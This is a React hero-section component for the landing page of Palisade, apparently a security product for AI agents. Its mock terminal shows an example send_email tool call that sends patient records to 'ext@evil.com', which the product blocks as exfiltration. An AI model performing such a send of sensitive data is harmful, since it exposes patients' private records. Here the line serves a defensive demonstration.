"use client";

import { motion } from "framer-motion";
import { TextReveal, Parallax } from "./AnimatedSection";

export function Hero() {
  return (
    <section className="relative pt-36 pb-24 px-6 overflow-hidden">
      {/* Floating parallax shapes — visible geometric accents */}
      <Parallax speed={0.35} className="absolute top-24 left-[6%] pointer-events-none">
        <motion.div
          initial={{ opacity: 0, scale: 0, rotate: 0 }}
          animate={{ opacity: 1, scale: 1, rotate: 12 }}
          transition={{ delay: 1.2, duration: 0.8, ease: "easeOut" }}
          className="h-20 w-20 rounded-2xl border-2 border-[#16a34a]/15 bg-[#16a34a]/[0.04]"
        />
      </Parallax>
      <Parallax speed={-0.25} className="absolute top-28 right-[8%] pointer-events-none">
        <motion.div
          initial={{ opacity: 0, scale: 0 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 1.4, duration: 0.8, ease: "easeOut" }}
          className="h-14 w-14 rounded-full border-2 border-[#16a34a]/20 bg-[#16a34a]/[0.06]"
        />
      </Parallax>
      <Parallax speed={0.2} className="absolute bottom-20 left-[12%] pointer-events-none">
        <motion.div
          initial={{ opacity: 0, scale: 0, rotate: 0 }}
          animate={{ opacity: 1, scale: 1, rotate: -12 }}
          transition={{ delay: 1.6, duration: 0.8, ease: "easeOut" }}
          className="h-12 w-12 rounded-xl border-2 border-[#e5e5e5] bg-[#f5f5f5]"
        />
      </Parallax>
      <Parallax speed={-0.3} className="absolute top-52 right-[18%] pointer-events-none">
        <motion.div
          initial={{ opacity: 0, scale: 0, rotate: 0 }}
          animate={{ opacity: 1, scale: 1, rotate: 45 }}
          transition={{ delay: 1.5, duration: 0.8, ease: "easeOut" }}
          className="h-8 w-8 rounded-lg border-2 border-[#16a34a]/15 bg-[#16a34a]/[0.05]"
        />
      </Parallax>
      <Parallax speed={0.4} className="absolute bottom-28 right-[6%] pointer-events-none">
        <motion.div
          initial={{ opacity: 0, scale: 0, rotate: 0 }}
          animate={{ opacity: 1, scale: 1, rotate: 20 }}
          transition={{ delay: 1.3, duration: 0.8, ease: "easeOut" }}
          className="h-16 w-16 rounded-2xl border-2 border-[#e5e5e5] bg-[#fafafa]"
        />
      </Parallax>

      <div className="relative mx-auto max-w-3xl text-center">
        {/* Badge */}
        <motion.div
          initial={{ opacity: 0, y: 16, scale: 0.95 }}
          animate={{ opacity: 1, y: 0, scale: 1 }}
          transition={{ duration: 0.5, delay: 0.05 }}
        >
          <span className="inline-flex items-center gap-2 rounded-full border border-[#e5e5e5] bg-[#fafafa] px-3.5 py-1 text-[12px] font-medium text-[#737373]">
            <span className="h-1.5 w-1.5 rounded-full bg-[#16a34a] animate-pulse" />
            Now with OpenClaw integration
          </span>
        </motion.div>

        {/* Headline — word-by-word reveal with blur */}
        <div className="mt-7 text-[clamp(2.25rem,5vw,3.5rem)] font-semibold leading-[1.1] tracking-tight text-[#0a0a0a]">
          <TextReveal text="Runtime intelligence" delay={0.15} />
          <br />
          <TextReveal text="for AI agents" delay={0.45} />
        </div>

        {/* Sub */}
        <motion.p
          initial={{ opacity: 0, y: 16, filter: "blur(6px)" }}
          animate={{ opacity: 1, y: 0, filter: "blur(0px)" }}
          transition={{ duration: 0.6, delay: 0.7 }}
          className="mt-5 text-[17px] leading-relaxed text-[#737373] max-w-xl mx-auto"
        >
          The security layer between AI agents and the real world. Risk-scored
          decisions, exfiltration detection, and a real-time audit trail for
          every tool call.
        </motion.p>

        {/* CTAs */}
        <motion.div
          initial={{ opacity: 0, y: 12 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.85 }}
          className="mt-9 flex items-center justify-center gap-3"
        >
          <a
            href="#waitlist"
            className="rounded-full bg-[#0a0a0a] px-6 py-2.5 text-[14px] font-medium text-white transition-all hover:opacity-80 hover:scale-[1.03] active:scale-[0.97]"
          >
            Get Early Access
          </a>
          <a
            href="#docs"
            className="rounded-full border border-[#e5e5e5] bg-white px-6 py-2.5 text-[14px] font-medium text-[#0a0a0a] transition-all hover:bg-[#fafafa] hover:scale-[1.03] active:scale-[0.97]"
          >
            Documentation
          </a>
        </motion.div>
      </div>

      {/* Terminal */}
      <motion.div
        initial={{ opacity: 0, y: 40, scale: 0.95 }}
        animate={{ opacity: 1, y: 0, scale: 1 }}
        transition={{ duration: 0.8, delay: 1.0, ease: [0.25, 0.1, 0.25, 1] }}
        className="mx-auto mt-16 max-w-2xl"
      >
        <div className="overflow-hidden rounded-xl border border-[#e5e5e5] shadow-sm transition-shadow hover:shadow-[0_8px_40px_rgba(0,0,0,0.08)]">
          {/* Title bar */}
          <div className="flex items-center gap-2 border-b border-[#e5e5e5] bg-[#fafafa] px-4 py-2.5">
            <div className="flex gap-1.5">
              <span className="h-3 w-3 rounded-full bg-[#ff5f57]" />
              <span className="h-3 w-3 rounded-full bg-[#febc2e]" />
              <span className="h-3 w-3 rounded-full bg-[#28c840]" />
            </div>
            <span className="ml-2 text-[11px] font-mono text-[#a3a3a3]">
              palisade &mdash; policy evaluation
            </span>
          </div>
          {/* Content — lines animate in sequentially */}
          <div className="bg-white p-5 font-mono text-[13px] leading-[1.7] text-left space-y-1.5">
            <motion.p
              initial={{ opacity: 0, x: -12 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 1.3 }}
              className="text-[#a3a3a3]"
            >
              # Agent tries to exfiltrate medical data
            </motion.p>
            <motion.p
              initial={{ opacity: 0, x: -12 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 1.5 }}
            >
              <span className="text-[#16a34a]">$</span>{" "}
              <span className="text-[#0a0a0a]">palisade evaluate</span>{" "}
              <span className="text-[#737373]">--tool send_email</span>
            </motion.p>
            <motion.p
              initial={{ opacity: 0, x: -12 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 1.65 }}
              className="text-[#a3a3a3] pl-4"
            >
              {`--args '{"to":"ext@evil.com","body":"<patient_records>"}'`}
            </motion.p>
            <motion.div
              initial={{ opacity: 0, y: 10, scale: 0.97 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              transition={{ delay: 1.9, duration: 0.5 }}
              className="mt-3 rounded-lg border border-[#fee2e2] bg-[#fef2f2] px-4 py-3 space-y-1"
            >
              <p className="flex items-center gap-2">
                <motion.span
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  transition={{ delay: 2.1, type: "spring", bounce: 0.5 }}
                  className="inline-flex h-5 items-center rounded bg-[#dc2626] px-1.5 text-[11px] font-semibold text-white"
                >
                  BLOCK
                </motion.span>
                <span className="text-[#0a0a0a]">risk score: 60</span>
              </p>
              <p className="text-[#737373] text-[12px]">
                Data exfiltration: sensitive data (medical) + external system (send_email)
              </p>
              <p className="text-[#a3a3a3] text-[11px]">
                Rules: touchesSensitiveData(30) + affectsExternalSystem(30)
              </p>
            </motion.div>
          </div>
        </div>
      </motion.div>
    </section>
  );
}
